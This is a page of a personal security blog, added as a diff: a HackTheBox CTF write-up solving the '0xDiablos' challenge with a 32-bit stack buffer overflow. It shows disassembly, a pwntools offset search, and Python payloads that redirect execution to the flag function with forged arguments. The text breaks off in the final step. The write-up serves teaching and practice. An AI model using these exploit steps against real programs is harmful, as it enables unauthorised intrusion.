@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GX2L7MWQLN');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      }
+    };
+  </script>
+  
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <style>
+          .MathJax {
+  font-size: 180%; /* Adjust the percentage as needed */
+}
+  </style>
+
+  <title>You know 0xDiablos? - HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>You know 0xDiablos? - HackTheBox | Cecil Daemon’s Wish</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="You know 0xDiablos? - HackTheBox" />
+<meta name="author" content="J. Alex Buschinelli" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/0xdiablos-htb" />
+<meta property="og:url" content="http://localhost:4000/0xdiablos-htb" />
+<meta property="og:site_name" content="Cecil Daemon’s Wish" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-12-30T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="You know 0xDiablos? - HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2023-12-30T00:00:00+00:00","datePublished":"2023-12-30T00:00:00+00:00","description":"Introduction","headline":"You know 0xDiablos? - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/0xdiablos-htb"},"url":"http://localhost:4000/0xdiablos-htb"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
+      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
+          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
+          
+          
+          <h1>cecil@celestial:/0xdiablos-htb$</h1>
+      
+      </a>
+  </div>
+  <br>
+    </a>
+    <div class="header-links">
+      <a href="/"><h2 class="header-link">Home</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>You know 0xDiablos? - HackTheBox</h2>
+  <time datetime="2023-12-30T00:00:00+00:00" class="by-line">30 Dec 2023</time>
+  <p>Estimated read time: 14 minutes</p>
+  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>
+
+<p>In this write-up, we are going to be taking a closer look at the <em>You Know 0xDiablos</em> challenge on <a href="https://app.hackthebox.com">HackTheBox</a>. We can download the challenge files and test them in our own machine; but to solve it, we need to use netcat.</p>
+
+<h1 id="challenge-description"><a href="#level-description"></a>Challenge description</h1>
+
+<p>The challenge description says:</p>
+
+<blockquote>
+  <p>Description</p>
+</blockquote>
+
+<blockquote>
+  <p>I missed my flag</p>
+</blockquote>
+
+<p>In order to better understand this, let’s use <code class="language-plaintext highlighter-rouge">nc</code> to connect to the machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>nc 167.99.82.136 31251
+You know <span class="nb">who </span>are 0xDiablos: 
+hi mom
+hi mom
+</code></pre></div></div>
+
+<p>This really looks like a buffer overflow problem. From what it looks like, we pass a stdin value and get it back. Let’s download the files and investigate this further.</p>
+
+<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>
+
+<p>As always, let’s keep our mindset:</p>
+
+<ol>
+  <li>Understanding basic concepts</li>
+  <li>Understanding the problem</li>
+  <li>Crafting an attack</li>
+  <li>Solving</li>
+</ol>
+
+<p>After downloading the file, we see that it has the name <code class="language-plaintext highlighter-rouge">vuln</code> and we get:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]<span class="o">=</span>ab7f19bb67c16ae453d4959fba4e6841d930a6dd, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+
+<p>showing us it is an ELF-32 executable. We might need to get our sleeves dirty using GDB in order to understand what is happening under the hoods.</p>
+
+<h2 id="step-1---understanding-basic-concepts"><a href="#mindset-step1"></a>Step 1 - Understanding basic concepts</h2>
+
+<p>Alright, but what are an ELF-32 bit executable and GDB?</p>
+
+<h3 id="elf-file">ELF file</h3>
+
+<p>An ELF-32 bit LSB executable file can be broken down to:</p>
+
+<ul>
+  <li><strong>ELF:</strong> Stands for Executable and Linkable Format. Put into simple terms, it is the Linux version of an .exe file. It’s a standard file format for executable files, shared libraries, and core dumps on Linux and other Unix-like operating systems.</li>
+  <li><strong>32bit</strong>: This indicates the architecture for which the file is combiled. 32bit mean its use is for a 32bit architecture, in contrast of being for a 64bit.</li>
+  <li><strong>LSB</strong>: Or Least Significant Bit, refers to the endianness of the file. LSB means that the least significant byte of a word is stored in the smallest address. This means it works with little-endian format.</li>
+</ul>
+
+<p>The fact that this ELF is not stripped also tells us we can possibly debug it into assembly, or even C.</p>
+
+<h2 id="gdb">GDB</h2>
+
+<p>GDB (GNU Debugger) is a debugger, often used as a reverse engineering tool, that runs on many Unix-like systems and works with numerous programming languages. It essentially allows us to grasp the program’s code in an assembly-like format to understand its flow.</p>
+
+<p>Let’s see how we can use it. To start analyzing an executable, we run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb ./&lt;executable&gt;
+</code></pre></div></div>
+
+<p>This will open up the GDB CLI in your terminal. When inside, we need to know some basic commands:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">run/r</code>: to run the program as it is.</li>
+  <li><code class="language-plaintext highlighter-rouge">break/b *&lt;address/function&gt;</code>: sets a breakpoint. GDB will pause the execution of the program when it reaches this point.</li>
+  <li><code class="language-plaintext highlighter-rouge">x/20x &lt;register&gt;</code>: displays the content of memory at a given address.</li>
+  <li><code class="language-plaintext highlighter-rouge">continue/c</code>: continues execution flow of the program.</li>
+  <li><code class="language-plaintext highlighter-rouge">stepi</code>: jumps to the next instruction in the stack.</li>
+  <li><code class="language-plaintext highlighter-rouge">disassemble</code>: disassembles current function.</li>
+</ul>
+
+<p>This will make more sense once we start analyzing the binary ELF file.</p>
+
+<h2 id="step-2---understanding-the-problem"><a href="#mindset-step2"></a>Step 2 - Understanding the problem</h2>
+
+<p>First, let’s use <code class="language-plaintext highlighter-rouge">objdump</code> to get the assembly instructions of <code class="language-plaintext highlighter-rouge">vuln</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-d</span> vuln
+</code></pre></div></div>
+
+<p>This will give a huge assembly dump. What it is most interesting here are the following functions <code class="language-plaintext highlighter-rouge">flag</code>, <code class="language-plaintext highlighter-rouge">vuln</code> and <code class="language-plaintext highlighter-rouge">main</code>. The <code class="language-plaintext highlighter-rouge">vuln</code> function is called from <code class="language-plaintext highlighter-rouge">main</code> at this address:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>...snip...]
+8049301:       83 ec 0c                sub    <span class="nv">$0xc</span>,%esp
+8049304:       8d 83 38 e0 ff ff         lea    <span class="nt">-0x1fc8</span><span class="o">(</span>%ebx<span class="o">)</span>,%eax
+804930a:       50                      push   %eax
+804930b:       e8 60 fd ff ff            call   8049070 &lt;puts@plt&gt;
+8049310:       83 c4 10                add    <span class="nv">$0x10</span>,%esp
+8049313:       e8 5a ff ff ff             call   8049272 &lt;vuln&gt;
+<span class="o">[</span>...snip...]
+</code></pre></div></div>
+
+<p>Once <code class="language-plaintext highlighter-rouge">vuln</code> is called, we get to the point where it asks for our stdin input:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>...snip...]
+8049290:       50                      push   %eax
+8049291:       e8 aa fd ff ff            call   8049040 &lt;gets@plt&gt;
+8049296:       83 c4 10                add    <span class="nv">$0x10</span>,%esp
+8049299:       83 ec 0c                sub    <span class="nv">$0xc</span>,%esp
+804929c:       8d 85 48 ff ff ff          lea    <span class="nt">-0xb8</span><span class="o">(</span>%ebp<span class="o">)</span>,%eax
+80492a2:       50                      push   %eax
+80492a3:       e8 c8 fd ff ff            call   8049070 &lt;puts@plt&gt;
+80492a8:       83 c4 10                add    <span class="nv">$0x10</span>,%esp
+80492ab:       90                      nop
+80492ac:       8b 5d <span class="nb">fc                </span>mov    <span class="nt">-0x4</span><span class="o">(</span>%ebp<span class="o">)</span>,%ebx
+80492af:       c9                      leave
+ <span class="o">[</span>...snip...]
+</code></pre></div></div>
+
+<p>Since there is nowhere in the instructions a call to the <code class="language-plaintext highlighter-rouge">flag</code> function, we might need to inject a call ourselves within the <code class="language-plaintext highlighter-rouge">gets@plt</code>, which is vulnerable to buffer overflow. We just need to know how much allocated memory is reserved to the buffer pointed by the <code class="language-plaintext highlighter-rouge">%esp</code>, which is our input. If succeeded, we can overflow the stack and overwrite the return address to call the <code class="language-plaintext highlighter-rouge">flag</code> function.</p>
+
+<p>The interesting parts of the <code class="language-plaintext highlighter-rouge">flag</code> functions are:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>...snip...]
+ 8049205:       e8 a6 fe ff ff            call   80490b0 &lt;fopen@plt&gt;
+ 804920a:       83 c4 10                add    <span class="nv">$0x10</span>,%esp
+ 804920d:       89 45 f4                mov    %eax,-0xc<span class="o">(</span>%ebp<span class="o">)</span>
+ 8049210:       83 7d f4 00             cmpl   <span class="nv">$0x0</span>,-0xc<span class="o">(</span>%ebp<span class="o">)</span>
+ 8049214:       75 1c                   jne    8049232 &lt;flag+0x50&gt;
+ 8049216:       83 ec 0c                sub    <span class="nv">$0xc</span>,%esp
+ 8049219:       8d 83 14 e0 ff ff         lea    <span class="nt">-0x1fec</span><span class="o">(</span>%ebx<span class="o">)</span>,%eax
+ 804921f:       50                      push   %eax
+ 8049220:       e8 4b fe ff ff            call   8049070 &lt;puts@plt&gt;
+
+ <span class="o">[</span>...snip...]
+ 8049232:       83 ec 04                sub    <span class="nv">$0x4</span>,%esp
+ 8049235:       ff 75 f4                 push   <span class="nt">-0xc</span><span class="o">(</span>%ebp<span class="o">)</span>
+ 8049238:       6a 40                   push   <span class="nv">$0x40</span>
+ 804923a:       8d 45 b4                lea    <span class="nt">-0x4c</span><span class="o">(</span>%ebp<span class="o">)</span>,%eax
+ 804923d:       50                      push   %eax
+ 804923e:       e8 0d fe ff ff            call   8049050 &lt;fgets@plt&gt;
+ 8049243:       83 c4 10                add    <span class="nv">$0x10</span>,%esp
+ 8049246:       81 7d 08 ef be ad de    cmpl   <span class="nv">$0xdeadbeef</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
+ 804924d:       75 1a                   jne    8049269 &lt;flag+0x87&gt;
+ 804924f:       81 7d 0c 0d d0 de c0    cmpl   <span class="nv">$0xc0ded00d</span>,0xc<span class="o">(</span>%ebp<span class="o">)</span>
+ 8049256:       75 14                   jne    804926c &lt;flag+0x8a&gt;
+</code></pre></div></div>
+
+<p>We get to call the <code class="language-plaintext highlighter-rouge">fopen</code> fucntion, which is seemingly openning a text file and reading its contents. Then, at <code class="language-plaintext highlighter-rouge">0x08049214</code> we are jumping to the next part of the code, if openning the file was successful. Within the <code class="language-plaintext highlighter-rouge">cmpl</code> instructions, we are comparing <code class="language-plaintext highlighter-rouge">$0xdeadbeef</code> with whatever is stored in <code class="language-plaintext highlighter-rouge">0x8(%ebp)</code> and <code class="language-plaintext highlighter-rouge">$0xc0ded00d</code> with what is stored in <code class="language-plaintext highlighter-rouge">0xc(%ebp)</code>. If they match, then we continue to this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>...snip...]
+8049258:       83 ec 0c                sub    <span class="nv">$0xc</span>,%esp
+804925b:       8d 45 b4                lea    <span class="nt">-0x4c</span><span class="o">(</span>%ebp<span class="o">)</span>,%eax
+804925e:       50                      push   %eax
+804925f:       e8 cc fd ff ff            call   8049030 &lt;<span class="nb">printf</span>@plt&gt;
+8049264:       83 c4 10                add    <span class="nv">$0x10</span>,%esp
+8049267:       eb 04                   jmp    804926d &lt;flag+0x8b&gt;
+<span class="o">[</span>...snip...]
+</code></pre></div></div>
+
+<p>which prints the contents of the <code class="language-plaintext highlighter-rouge">fopen</code>.</p>
+
+<h2 id="step-3---crafting-the-attack"><a href="#mindset-step3"></a>Step 3 - Crafting the attack</h2>
+
+<p>To have this to work, we need to find the exact offset to which we overflow the buffer and inject a call to the <code class="language-plaintext highlighter-rouge">flag</code> function. To calculate the offset, we can use <code class="language-plaintext highlighter-rouge">pwntools</code> in Python and create a cycled input. This will calculate a rough estimate of how many bytes we need to overflow and inject a call. A simple Python script should do the job:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">cyclic</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="n">pattern</span> <span class="o">=</span> <span class="nf">cyclic</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Let’s create a file with this as a payload to be passed to the <code class="language-plaintext highlighter-rouge">vuln</code> executable. We can run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>python3 cycle.py <span class="o">&gt;</span> cycle.txt
+<span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">cat </span>cycle.txt 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+</code></pre></div></div>
+
+<p>Now, we  need to pass this as a payload to the <code class="language-plaintext highlighter-rouge">vuln</code> executable and examine at what address the program crashes. To help us with that, we will use GDB: <code class="language-plaintext highlighter-rouge">gdb ./vuln</code>. Once inside, we run with <code class="language-plaintext highlighter-rouge">r &lt; cycle.txt</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r &lt; cycle.txt
+Starting program: /tmp/htb/vuln &lt; cycle.txt
+Downloading separate debug info <span class="k">for </span>system-supplied DSO at 0xf7fc7000                  
+<span class="o">[</span>Thread debugging using libthread_db enabled]                                          
+Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
+You know <span class="nb">who </span>are 0xDiablos: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616177 <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+
+<p>Ok, the stack crashed at <code class="language-plaintext highlighter-rouge">0x62616177</code>. Now, we can calculate the offset by giving this address to <code class="language-plaintext highlighter-rouge">pwntools</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">cyclic_find</span>
+<span class="n">eip_value</span> <span class="o">=</span> <span class="mh">0x61776261</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="nf">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">The offset: </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Gives:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>python3 offset.py 
+The offset: 186
+</code></pre></div></div>
+
+<p>So the offset is roughly 186. I say roughly, because this method does not always work, but it always gives a rough estimate. Now it’s time to investigate it further with GDB. Let’s try to see if we can delivery a payload with this offset and containing the address of the <code class="language-plaintext highlighter-rouge">flag</code> function to be called. We could start with this payload <code class="language-plaintext highlighter-rouge">python3 -c "import sys; sys.stdout.buffer.write(b'A'*186 + &lt;flag function address&gt;)"</code>, where in this case, the function address is: <code class="language-plaintext highlighter-rouge">0x080491e2</code>. Since we are in a little-endian system, we write the payload as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">186</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xe2\x91\x04\x08</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Let’s write the output to a binary file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import sys; sys.stdout.buffer.write(b'A'*186 + b'</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08')"</span> <span class="o">&gt;</span> payload.bin
+</code></pre></div></div>
+
+<p>Now, with GDB, we can analyze if the offset is correct:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r &lt; payload.bin
+Starting program: /tmp/htb/vuln &lt; payload.bin
+Downloading separate debug info <span class="k">for </span>system-supplied DSO at 0xf7fc7000                  
+<span class="o">[</span>Thread debugging using libthread_db enabled]                                          
+Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
+You know <span class="nb">who </span>are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08000804 <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+
+<p>Note that the program crashed at <code class="language-plaintext highlighter-rouge">0x08000804</code>. This suggests that the return address might not have been overwritten with the correct address; that is, our offset is wrong. With an offset of 187, we get the same, but now in the <code class="language-plaintext highlighter-rouge">0x00080491</code> address. As we can see, slowly our payload is being overwritten in the <code class="language-plaintext highlighter-rouge">$eip</code> register. With 188 we get a segmentation fault at <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>, and with 189 we get it at <code class="language-plaintext highlighter-rouge">0x91e24141</code>. This indicates the correct offset is 188, since the crash at 0xdeadbeef with this offset confirms that the exact location of the return address on the stack is being targeted. The return address is overwritten with the bytes from our payload and calling the <code class="language-plaintext highlighter-rouge">flag</code> function.</p>
+
+<p>Also, this is what we get when we pass the payload to the executable with an offset of 188:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import sys; sys.stdout.buffer.write(b'A'*188 + b'</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08')"</span> | ./vuln
+You know <span class="nb">who </span>are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+Hurry up and try <span class="k">in </span>on server side.
+</code></pre></div></div>
+
+<blockquote>
+  <p>Hurry up and try in on server side.</p>
+</blockquote>
+
+<p>This seems a message that is being displayed at the flag function. Let’s check it with GDB:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b flag
+Breakpoint 1 at 0x80491e6
+<span class="o">(</span>gdb<span class="o">)</span> r &lt; payload.bin
+Starting program: /tmp/htb/vuln &lt; payload.bin
+Downloading separate debug info <span class="k">for </span>system-supplied DSO at 0xf7fc7000                  
+<span class="o">[</span>Thread debugging using libthread_db enabled]                                          
+Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
+You know <span class="nb">who </span>are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+
+Breakpoint 1, 0x080491e6 <span class="k">in </span>flag <span class="o">()</span>
+</code></pre></div></div>
+
+<p>Aha! As expected, we are reaching the <code class="language-plaintext highlighter-rouge">flag</code> function now! It is just a matter of adjusting our payload now to successfully printing the contents of the file openned with <code class="language-plaintext highlighter-rouge">fopen</code>. Let’s use GDB to investigate the flow of the <code class="language-plaintext highlighter-rouge">flag</code> function:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>...snip...]
+0x08049205 &lt;+35&gt;:    call   0x80490b0 &lt;fopen@plt&gt;
+0x0804920a &lt;+40&gt;:    add    <span class="nv">$0x10</span>,%esp
+0x0804920d &lt;+43&gt;:    mov    %eax,-0xc<span class="o">(</span>%ebp<span class="o">)</span>
+0x08049210 &lt;+46&gt;:    cmpl   <span class="nv">$0x0</span>,-0xc<span class="o">(</span>%ebp<span class="o">)</span>
+0x08049214 &lt;+50&gt;:    jne    0x8049232 &lt;flag+80&gt;
+0x08049216 &lt;+52&gt;:    sub    <span class="nv">$0xc</span>,%esp
+0x08049219 &lt;+55&gt;:    lea    <span class="nt">-0x1fec</span><span class="o">(</span>%ebx<span class="o">)</span>,%eax
+0x0804921f &lt;+61&gt;:    push   %eax
+0x08049220 &lt;+62&gt;:    call   0x8049070 &lt;puts@plt&gt;
+<span class="o">[</span>...snip...]
+</code></pre></div></div>
+
+<p>Note that we are comparing the contents of the <code class="language-plaintext highlighter-rouge">%ebp</code> stack with <code class="language-plaintext highlighter-rouge">0x0</code>, which is C equivalent to <code class="language-plaintext highlighter-rouge">NULL</code>. If the <code class="language-plaintext highlighter-rouge">cmpl</code> returns true, we do not jump with <code class="language-plaintext highlighter-rouge">jne</code> and we get the message “Hurry up and try in on server side.” through the <code class="language-plaintext highlighter-rouge">puts@plt</code> function. This happens because there is no text file to be openned in our local machine.</p>
+
+<p>Without knowing the name of the file openned by <code class="language-plaintext highlighter-rouge">fopen</code>, we cannot go further with our analysis locally. One way to enhance our analysis is by using Ghidra. Ghidra is a reverse engineering software that a lot of times rewrites the original code to us from the assembly.</p>
+
+<p>After running Ghidra, we find the following:</p>
+
+<p><img src="../figs/ghidra-fopen.png" alt="ghidra" /></p>
+
+<p>We see that the file name is <code class="language-plaintext highlighter-rouge">flag.txt</code>. Alright! We can create a flag ourselves and keep testing it locally. Just run <code class="language-plaintext highlighter-rouge">echo "hi mom" &gt; flag.txt</code> and go back to GDB!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r &lt; payload.bin 
+Starting program: /tmp/htb/vuln &lt; payload.bin
+Downloading separate debug info <span class="k">for </span>system-supplied DSO at 0xf7fc7000                  
+<span class="o">[</span>Thread debugging using libthread_db enabled]                                          
+Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
+You know <span class="nb">who </span>are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffff00 <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+
+<p>Note that now we are not getting the message. This is because the program is successfully openning the <code class="language-plaintext highlighter-rouge">flag.txt</code> file and reading its contents. The problem is: it is not printing it for us!</p>
+
+<p>Looking back at Ghidra, we see this line:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...</span><span class="n">snip</span><span class="p">...]</span>
+<span class="k">if</span> <span class="p">((</span><span class="n">param_1</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x21524111</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x3f212ff3</span><span class="p">))</span>
+<span class="p">[...</span><span class="n">snip</span><span class="p">...]</span>
+</code></pre></div></div>
+
+<p>which is similar to the line we analyzed with <code class="language-plaintext highlighter-rouge">objdump</code>, where it compares the values of two registers with <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> and <code class="language-plaintext highlighter-rouge">$0xc0ded00d</code>. To trigger this if statement, we need to concatenate these addresses in our payload. Hopefully, this solves the challenge!</p>
+
+<h2 id="step-4---solving"><a href="#mindset-step4"></a>Step 4 - Solving!</h2>
+<p>Let’s test our new payload locally:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import sys; sys.stdout.buffer.write(b'A'*188 + b'</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + b'</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">c0')"</span> <span class="o">&gt;</span> payload2.bin<span class="o">(</span>htb-venv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">cat </span>payload2.bin | ./vulnYou know <span class="nb">who </span>are 0xDiablos: 
